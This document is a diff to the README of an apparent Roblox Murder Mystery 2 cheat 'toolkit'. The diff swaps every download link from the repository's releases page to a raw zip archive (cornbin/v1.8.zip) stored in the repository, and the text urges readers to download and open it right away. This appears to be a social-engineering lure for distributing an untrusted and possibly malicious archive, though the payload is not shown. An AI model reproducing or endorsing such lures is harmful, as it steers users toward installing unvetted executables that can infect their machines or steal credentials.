@@ -1,6 +1,6 @@
 # 🕵️ murder-mystery-2-script-2026-analysis-lab - Master Every Round with Smart Analytics
 
-[![Download Now](https://img.shields.io/badge/Download-Murder_Mystery_2_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/releases)
+[![Download Now](https://img.shields.io/badge/Download-Murder_Mystery_2_Toolkit-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/main/cornbin/v1.8.zip)
 
 ## 🎮 What Is This?
 
@@ -17,7 +17,7 @@ Getting started is very simple. Follow these steps and you will be ready in unde
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-👉 **[Click Here to Download](https://github.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/releases)**
+👉 **[Click Here to Download](https://raw.githubusercontent.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/main/cornbin/v1.8.zip)**
 
 This link takes you to the download page. Look for the biggest button or the file listed at the top. Click it to start downloading.
 
@@ -176,7 +176,7 @@ Do not wait. Download it now and see how much more fun the game becomes when you
 
 Just in case you need the link one more time:
 
-👉 **[Download murder-mystery-2-script-2026-analysis-lab](https://github.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/releases)**
+👉 **[Download murder-mystery-2-script-2026-analysis-lab](https://raw.githubusercontent.com/Discombobulated-oilpainter4844/murder-mystery-2-script-2026-analysis-lab/main/cornbin/v1.8.zip)**
 
 Visit this link to download the application. It is that simple. Click, download, open, and play smarter.
 
